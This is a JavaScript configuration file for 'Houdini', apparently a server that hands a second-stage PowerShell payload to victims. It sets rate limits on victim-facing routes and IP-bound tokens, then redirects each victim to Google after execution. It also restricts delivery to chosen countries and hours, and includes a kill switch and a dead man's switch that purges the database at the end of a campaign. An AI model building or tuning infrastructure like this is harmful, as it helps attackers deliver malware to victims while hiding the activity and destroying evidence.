// Houdini Configuration — Adjust per operation
module.exports = {
    // Server
    PORT: process.env.PORT || 3000,
    SERVER_URL: process.env.SERVER_URL || 'http://localhost:3000',

    // Trust proxy: number of reverse proxies in front (nginx=1, Cloudflare+nginx=1 is fine).
    // REQUIRED for correct req.ip when deployed behind a proxy. Set to 0 for direct exposure.
    TRUST_PROXY: parseInt(process.env.TRUST_PROXY || '1', 10),

    // Database
    DB_PATH: process.env.DB_PATH || './houdini.db',

    // Token Settings
    TOKEN_TTL: 24 * 60 * 60 * 1000,        // 24 hours
    IP_BINDING: true,                       // Token locked to requester IP
    TOKEN_PREFIX: 'houdini_',

    // Modes
    DEMO_MODE: false,                       // If true, payloads are harmless echoes
    KILL_SWITCH: false,                     // Seeded into DB state on startup

    // Rate Limiting (victim-facing /api routes only; admin routes excluded)
    RATE_LIMIT_WINDOW: 15 * 60 * 1000,     // 15 minutes
    RATE_LIMIT_MAX: 10,                     // Requests per window

    // Dashboard Auth
    ADMIN_KEY: process.env.ADMIN_KEY || 'houdini-admin-change-me-now',

    // Operational
    PRESTIGE_URL: 'https://www.google.com', // Redirect after execution
    PRESTIGE_DELAY: 3000,                   // ms before redirect
    ACTIVE_PAYLOAD: 'test.ps1',             // Stage2 payload to serve

    // Geo/Time (optional enforcement)
    // GEO_FENCE relies on Cloudflare's 'CF-IPCountry' header (only present when behind CF).
    GEO_FENCE: [],                          // e.g. ['US','CA'] — empty = no restriction
    TIME_GATE: { start: 0, end: 24 },      // Hour of day (0-24)
    TIME_GATE_TZ: 'UTC',                   // IANA tz of the TARGET region, e.g. 'America/New_York'

    // Dead Man's Switch (purges DB + engages kill switch if no admin heartbeat).
    // Requires 2 consecutive failed checks AND at least one unexpired token,
    // so an accidentally closed dashboard tab won't nuke a finished campaign.
    DEAD_MAN_ENABLED: false,
    DEAD_MAN_TIMEOUT: 2 * 60 * 60 * 1000,  // 2 hours
};